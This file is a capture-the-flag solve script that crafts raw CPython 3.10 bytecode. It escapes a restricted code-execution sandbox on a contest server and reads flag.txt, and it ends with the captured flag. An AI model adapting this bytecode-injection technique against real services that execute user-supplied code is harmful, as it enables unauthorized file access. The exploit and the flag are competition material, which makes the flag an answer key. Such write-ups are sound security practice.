#!/usr/bin/env python3

from pwn import *
import base64, binascii
import math

# dis.opmap of CPython 3.10
opmap = {'POP_TOP': 1, 'ROT_TWO': 2, 'ROT_THREE': 3, 'DUP_TOP': 4, 'DUP_TOP_TWO': 5, 'ROT_FOUR': 6, 'NOP': 9, 'UNARY_POSITIVE': 10, 'UNARY_NEGATIVE': 11, 'UNARY_NOT': 12, 'UNARY_INVERT': 15, 'BINARY_MATRIX_MULTIPLY': 16, 'INPLACE_MATRIX_MULTIPLY': 17, 'BINARY_POWER': 19, 'BINARY_MULTIPLY': 20, 'BINARY_MODULO': 22, 'BINARY_ADD': 23, 'BINARY_SUBTRACT': 24, 'BINARY_SUBSCR': 25, 'BINARY_FLOOR_DIVIDE': 26, 'BINARY_TRUE_DIVIDE': 27, 'INPLACE_FLOOR_DIVIDE': 28, 'INPLACE_TRUE_DIVIDE': 29, 'GET_LEN': 30, 'MATCH_MAPPING': 31, 'MATCH_SEQUENCE': 32, 'MATCH_KEYS': 33, 'COPY_DICT_WITHOUT_KEYS': 34, 'WITH_EXCEPT_START': 49, 'GET_AITER': 50, 'GET_ANEXT': 51, 'BEFORE_ASYNC_WITH': 52, 'END_ASYNC_FOR': 54, 'INPLACE_ADD': 55, 'INPLACE_SUBTRACT': 56, 'INPLACE_MULTIPLY': 57, 'INPLACE_MODULO': 59, 'STORE_SUBSCR': 60, 'DELETE_SUBSCR': 61, 'BINARY_LSHIFT': 62, 'BINARY_RSHIFT': 63, 'BINARY_AND': 64, 'BINARY_XOR': 65, 'BINARY_OR': 66, 'INPLACE_POWER': 67, 'GET_ITER': 68, 'GET_YIELD_FROM_ITER': 69, 'PRINT_EXPR': 70, 'LOAD_BUILD_CLASS': 71, 'YIELD_FROM': 72, 'GET_AWAITABLE': 73, 'LOAD_ASSERTION_ERROR': 74, 'INPLACE_LSHIFT': 75, 'INPLACE_RSHIFT': 76, 'INPLACE_AND': 77, 'INPLACE_XOR': 78, 'INPLACE_OR': 79, 'LIST_TO_TUPLE': 82, 'RETURN_VALUE': 83, 'IMPORT_STAR': 84, 'SETUP_ANNOTATIONS': 85, 'YIELD_VALUE': 86, 'POP_BLOCK': 87, 'POP_EXCEPT': 89, 'STORE_NAME': 90, 'DELETE_NAME': 91, 'UNPACK_SEQUENCE': 92, 'FOR_ITER': 93, 'UNPACK_EX': 94, 'STORE_ATTR': 95, 'DELETE_ATTR': 96, 'STORE_GLOBAL': 97, 'DELETE_GLOBAL': 98, 'ROT_N': 99, 'LOAD_CONST': 100, 'LOAD_NAME': 101, 'BUILD_TUPLE': 102, 'BUILD_LIST': 103, 'BUILD_SET': 104, 'BUILD_MAP': 105, 'LOAD_ATTR': 106, 'COMPARE_OP': 107, 'IMPORT_NAME': 108, 'IMPORT_FROM': 109, 'JUMP_FORWARD': 110, 'JUMP_IF_FALSE_OR_POP': 111, 'JUMP_IF_TRUE_OR_POP': 112, 'JUMP_ABSOLUTE': 113, 'POP_JUMP_IF_FALSE': 114, 'POP_JUMP_IF_TRUE': 115, 'LOAD_GLOBAL': 116, 'IS_OP': 117, 'CONTAINS_OP': 118, 'RERAISE': 119, 'JUMP_IF_NOT_EXC_MATCH': 121, 'SETUP_FINALLY': 122, 'LOAD_FAST': 124, 'STORE_FAST': 125, 'DELETE_FAST': 126, 'GEN_START': 129, 'RAISE_VARARGS': 130, 'CALL_FUNCTION': 131, 'MAKE_FUNCTION': 132, 'BUILD_SLICE': 133, 'LOAD_CLOSURE': 135, 'LOAD_DEREF': 136, 'STORE_DEREF': 137, 'DELETE_DEREF': 138, 'CALL_FUNCTION_KW': 141, 'CALL_FUNCTION_EX': 142, 'SETUP_WITH': 143, 'EXTENDED_ARG': 144, 'LIST_APPEND': 145, 'SET_ADD': 146, 'MAP_ADD': 147, 'LOAD_CLASSDEREF': 148, 'MATCH_CLASS': 152, 'SETUP_ASYNC_WITH': 154, 'FORMAT_VALUE': 155, 'BUILD_CONST_KEY_MAP': 156, 'BUILD_STRING': 157, 'LOAD_METHOD': 160, 'CALL_METHOD': 161, 'LIST_EXTEND': 162, 'SET_UPDATE': 163, 'DICT_MERGE': 164, 'DICT_UPDATE': 165}

# co_consts @ 0xb4
key_string = " Decodes the object input and returns a tuple (output\n            object, length consumed).\n\n            input must be an object which provides the bf_getreadbuf\n            buffer slot. Python strings, buffer objects and memory\n            mapped files are examples of objects providing this slot.\n\n            errors defines the error handling to apply. It defaults to\n            'strict' handling.\n\n            The method may not store state in the Codec instance. Use\n            StreamReader for codecs which have to keep state in order to\n            make decoding efficient.\n\n            The decoder must be able to handle zero length input and\n            return an empty object of the output object type in this\n            situation.\n\n        \n"

def _create_num(n):
    assert 0 <= n < 0x100
    c = b''
    c += bytes([opmap['LOAD_CONST'], 0] * n)
    c += bytes([opmap['BUILD_TUPLE'], n])
    c += bytes([opmap['GET_LEN'], 0])
    c += bytes([opmap['ROT_TWO'], 0])
    c += bytes([opmap['POP_TOP'], 0])
    return c

def create_num(n):
    c = b''
    # sqrt decomposition for shorter payload
    sq = math.isqrt(n)
    c += _create_num(sq)
    c += bytes([opmap['DUP_TOP'], 0])
    c += bytes([opmap['BINARY_MULTIPLY'], 0])
    c += _create_num(n - sq*sq)
    c += bytes([opmap['BINARY_ADD'], 0])
    return c

def create_str(s):
    assert 0 <= len(s) < 0x100 and all(ch in key_string for ch in s)
    c = b''
    for ch in s:
        idx = key_string.find(ch)
        c += bytes([opmap['LOAD_CONST'], 0xb4])
        c += create_num(idx)
        c += bytes([opmap['BINARY_SUBSCR'], 0])
    c += bytes([opmap['BUILD_STRING'], len(s)])
    return c

p = remote('even-less-arbitrary-code-execution.crewctf-2022.crewc.tf', 1337)

# co_names generating co_code
code = create_str('get_data') + bytes([opmap['BUILD_TUPLE'], 1]) + b'\x53\x00'
p.sendlineafter('Enter names: ', base64.b64encode(code))

# main co_code
code  = b''
code += bytes([opmap['LOAD_CONST'], 52])  # <class '_frozen_importlib_external.SourceFileLoader'>
code += bytes([opmap['LOAD_METHOD'], 0])  # SourceFileLoader.get_data
code += bytes([opmap['LOAD_CONST'], 0])
code += create_str('flag.txt')
code += bytes([opmap['CALL_METHOD'], 2])
code += bytes([opmap['RETURN_VALUE'], 0])
p.sendlineafter('Enter code: ', base64.b64encode(code))
print(p.recvall())

### crew{I75_Ju57_5helLC0DE_wh475_7hE_pR08Lem?} ###